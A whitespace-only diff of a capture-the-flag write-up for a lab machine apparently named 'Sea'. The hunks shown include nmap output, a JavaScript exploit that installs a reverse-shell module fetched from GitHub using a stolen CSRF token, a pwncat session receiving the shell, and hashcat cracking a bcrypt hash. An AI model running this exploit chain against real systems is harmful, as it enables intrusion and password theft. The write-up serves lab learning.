@@ -7,18 +7,18 @@ Let’s begin with an nmap scan:
 ```bash
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 e354e072203c014293d1669d900cabe8 (RSA)
 |   256 f3244b08aa519d56153d6756747c2038 (ECDSA)
 |_  256 30b105c64150ff22a37f41060e67fd50 (ED25519)
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET POST OPTIONS
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Sea - Home
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
 |_      httponly flag not set
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
@@ -61,7 +61,7 @@ if (url.endsWith("/")) {
  url = url.slice(0, -1);
 }
 var urlWithoutLog = url.split("/").slice(0, -1).join("/");
-var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
+var urlWithoutLogBase = new URL(urlWithoutLog).pathname;
 var token = document.querySelectorAll('[name="token"]')[0].value;
 var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
 var xhr3 = new XMLHttpRequest();
@@ -82,7 +82,7 @@ xhr3.onload = function() {
        xhr5.withCredentials = true;
        xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
        xhr5.send();
-       
+
      }
    };
  }
@@ -127,7 +127,7 @@ wncat-cs :1234
 [19:53:25] received connection from 10.10.11.28:35156                                      bind.py:84
 [19:53:33] 0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                 manager.py:957
 [19:53:35] 10.10.11.28:35156: registered new host w/ db                                manager.py:957
-(local) pwncat$                                                                                      
+(local) pwncat$
 (remote) www-data@sea:/$ whoami
 www-data
 ```
@@ -152,7 +152,7 @@ Hash password. Using hashid we found nothing. Strange. And after a bit of resear
 Let's remove them and then use `hashcat`:
 
 ```bash
-hashcat hash.txt -m 3200 /opt/rockyou.txt 
+hashcat hash.txt -m 3200 /opt/rockyou.txt
 hashcat (v6.2.6) starting
 
 OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -185,7 +185,7 @@ Dictionary cache built:
 [s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>
 
 $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:<password>
-                                                          
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
